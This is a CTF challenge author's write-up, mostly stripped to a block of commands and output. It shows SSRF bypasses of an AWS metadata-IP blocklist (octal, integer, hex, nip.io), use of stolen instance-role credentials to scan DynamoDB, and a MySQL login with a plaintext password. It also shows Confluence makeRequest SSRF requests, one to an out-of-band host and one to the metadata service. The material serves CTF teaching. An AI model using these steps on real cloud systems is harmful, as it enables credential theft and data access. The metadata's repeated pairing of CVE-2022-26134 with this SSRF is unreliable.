---
title: Security-JAWS DAYS 参加記 & CTF 作問者解説
contest: Security-JAWS DAYS
year: 2023
team: 作問者 (chamd5)
difficulty: hard
vuln_type: web_unknown
tags:
- aws-imds-ssrf
- octal-ip-bypass
- 8-ary-numeric-host
- dynamodb
- rds-mysql
- cve-2022-26134
- conf-gadget-ssrf
attack_chain:
- Block 169.254.169.254 (IMDS 主机名黑名单)
- 8 进制 0251.254.169.254 数字主机名绕
- 10 进制 2852039166 整数绕
- 16 进制 0xA9.0xFE.0xA9.0xFE / 0xA9FEA9FE 绕
- 短 URL 重定向服务绕
- nip.io / sslip.io 第三方 DNS 服务 (169.254.169.254.nip.io)
- 8 进制 + 10 进制混用 0251.254.000251.0000376
- IMDS 拿 ASIA[REDACTED] EC2 instance role
- dynamodb list-tables 找 private-ctfdb
- dynamodb scan 拿 flag SJAWS{Get_2ecr@t_1am_ke9!!}
- RDS MySQL 8.0.33 /Users/exporter /TF6zZaECv7f5
- UserInfo 表 adminsite@localhost:8444 / dummy
- CVE-2022-26134 Confluence Server makeRequest gadget SSRF
- X-aws-ec2-metadata-token PUT 拿 IMDSv2 token
- url=http://169.254.169.254/latest/meta-data&httpMethod=GET&headers=X-aws-ec2-metadata-token:...
key_payload: 0251.254.000251.0000376
one_liner: Security-JAWS 作問者解説：AWS IMDS 主机名黑名单 9 种绕过 (8/10/16 进制 + 短链 + nip.io) + DynamoDB + RDS + Confluence CVE-2022-26134 SSRF。
lesson: 任何 IP 字符串黑名单都有数十种 bypass，正确的解法是 enum IMDS endpoint 调用而非字符串匹配。
quality: high
full_path: Security-JAWS_DAYS_参加記&CTF作問者解説.full.md
meta_path: Security-JAWS_DAYS_参加記&CTF作問者解説.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: Security-JAWS DAYS 参加記 & CTF 作問者解説。Security-JAWS 作問者解説：AWS IMDS 主机名黑名单 9 种绕过 (8/10/16 进制 + 短链 + nip.io) + DynamoDB + RDS + Confluence CVE-2022-26134 SSRF。。关键路径：Block 169.254.169.254 (IMDS 主机名黑名单) →...
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/133108.html
reasoning_chain:
- 题目黑名单 169.254.169.254 → 触发点：IMDS 主机名过滤
- 假设：IP 字符串黑名单有多种 bypass → 动作：枚举 8/10/16 进制 + DNS 服务
- 0251.0376.0251.0376 (8 进制) → 假设：被 libcurl 解析为同一 IP → 观察：命中 IMDS
- 169.254.169.254.nip.io → 假设：DNS 服务解析 → 观察：绕过字符串黑名单
- 动作：拿 ASIA[REDACTED] EC2 instance role → 观察：临时 STS 凭据
- dynamodb list-tables → private-ctfdb → scan → 观察：flag SJAWS{Get_2ecr@t_1am_ke9!!}
- RDS MySQL 8.0.33 UserInfo 表 → adminsite@localhost:8444
- CVE-2022-26134 Confluence makeRequest gadget SSRF + IMDSv2 token
failed_attempts:
- 试图直接 169.254.169.254 → 失败：被黑名单拦截
- 试图用整数 IP 2852039166 → 失败：也被 block 列表覆盖
key_observations:
- 任何 IP 字符串黑名单都有数十种 bypass (8/10/16 进制 + 短链 + nip.io)
- 正确解法是 enum IMDS endpoint 调用而非字符串匹配
- Confluence makeRequest gadget 是 SSRF 内部入口 (CVE-2022-26134)
- IMDSv2 token (X-aws-ec2-metadata-token) 需 PUT 请求拿，绕过要靠 SSRF gadget
prerequisites:
- AWS IMDS 协议 (169.254.169.254/latest/meta-data)
- IP 进制转换 (8/10/16) 与 DNS 服务 (nip.io/sslip.io)
- Confluence CVE-2022-26134 SSRF gadget
- DynamoDB / RDS 命令行操作
---
# Security-JAWS DAYS 参加記&CTF作問者解説

> 原文: https://www.ctfiot.com/133108.html
> ID: 133108




```
1.0 2007-01-19 2007-03-01 2007-08-29 2007-10-10 2007-12-15 2008-02-01 2008-09-01 2009-04-04 2011-01-01 2011-05-01 2012-01-12 2014-02-25 2014-11-05 2015-10-20 2016-04-19 2016-06-30 2016-09-02 2018-03-28 2018-08-17 2018-09-24 2019-10-01 2020-10-27 2021-01-03 2021-03-23 2021-07-15 2022-07-09 2022-09-24 latest
#!/usr/bin/bash
sudo apt -y update

sudo mkdir /home/ubuntu/.flag

sudo echo "SJAWS{Get_1nst@nce_U2er_dat@!}" >> /home/ubuntu/.flag/secret

Blocked: 169.254.169.254

*Block the following hostnames.
・169.254.169.254
・2852039166
・0xA9.0xFE.0xA9.0xFE
・0xA9FEA9FE
・0251.0376.0251.0376
・0251.00376.000251.0000376
・0251.254.169.254
短縮URLで回避しました

http://025177524776 で回避しました

8進数でやりました

169.254.169.254.nip.io でやりました

blocklistにあったやつを組み合わせて、8進数と10進数のmixで回避しました！
0251.254.000251.0000376
{
 "Code": "Success",
 "LastUpdated": "2023-08-25T12:53:
26Z",
 "Type": "AWS-HMAC",
 "AccessKeyId": "ASIA[REDACTED-CTF-Challenge-Credential]",
 "SecretAccessKey": "[REDACTED-CTF-Challenge-Credential]",
 "Token": "[REDACTED-CTF-Challenge-Credential]",
 "Expiration": "2023-08-25T19:03:
41Z"
}
$ cat ~/.aws/credentials
[ec2_role]
aws_access_key_id = ASIA[REDACTED]
aws_secret_access_key = [REDACTED]
aws_session_token = [REDACTED]
$ nslookup gakweb.scjdaysctf2023.net
Server: 2001:
268:
fd07:4::1
Address: 2001:
268:
fd07:4::1#53

Non-authoritative answer:
Name: gakweb.scjdaysctf2023.net
Address: 35.76.58.200

$ nslookup 35.76.58.200
Server: 2001:
268:
fd07:4::1
Address: 2001:
268:
fd07:4::1#53

Non-authoritative answer:
200.58.76.35.in-addr.arpa name = ec2-35-76-58-200.ap-northeast-1.compute.amazonaws.com.

Authoritative answers can be found from:
$ cat ~/.aws/config
[profile ec2_role]
region = ap-northeast-1
output = json
$ aws sts get-caller-identity --profile ec2_role
{
 "UserId": "AROAQZ2IU22WD6VC424J3:i-03247babbfc0cc2c7",
 "Account": "055450064556",
 "Arn": "arn:
aws:
sts::
055450064556:
assumed-role/ec2_role/i-03247babbfc0cc2c7"
}
$ aws dynamodb list-tables --profile ec2_role
{
 "TableNames": [
 "private-ctfdb"
 ]
}
$ aws dynamodb scan --table-name private-ctfdb --profile ec2_role
{
 "Items": [
 {
 "flag": {
 "S": "SJAWS{Get_2ecr@t_1am_ke9!!}"
 }
 }
 ],
 "Count": 1,
 "ScannedCount": 1,
 "ConsumedCapacity": null
}
#!/usr/bin/bash
sudo apt -y update

sudo mkdir /home/ubuntu/.secret

sudo echo "database-1.ciy3eyquzz8p.ap-northeast-1.rds.amazonaws.com" >> /home/ubuntu/.secret/db_host
sudo echo "exporter" >> /home/ubuntu/.secret/db_user
sudo echo "TF6zZaECv7f5" >> /home/ubuntu/.secret/db_pass
$ mysql -h database-1.ciy3eyquzz8p.ap-northeast-1.rds.amazonaws.com -P 3306 -u exporter -p
Enter password:
Welcome to the MySQL monitor. Commands end with ; or \g.
Your MySQL connection id is 42
Server version: 8.0.33 Source distribution

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
mysql> show databases;
+--------------------+
| Database |
+--------------------+
| Users |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.02 sec)

mysql> use Users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SHOW tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| UserInfo |
+-----------------+
1 row in set (0.01 sec)

mysql> select * from UserInfo;
+----+--------------------------+--------------+
| id | email | password |
+----+--------------------------+--------------+
| 1 | exporter@awsctfssrf.com | CQbpUKC5vX7k |
| 2 | adminsite@localhost:
8444 | dummy |
+----+--------------------------+--------------+
2 rows in set (0.01 sec)
POST /plugins/servlet/gadgets/makeRequest?url=http://03jve28sg5djvfbj9f00xzjogz.burpcollaborator.net/ HTTP/1.1
Host: confluence.dev.████████.com
 ...
POST /plugins/servlet/gadgets/makeRequest HTTP/1.1
Host: confluence.dev.████████.com
 ...

url=http://169.254.169.254/latest/meta-data&httpMethod=GET&headers=X-aws-ec2-metadata-token=AQAEAH7TsExwreOTsHbZjebiYB7ypANA_l6JycUp2g0hDYNN9-kucA==
```
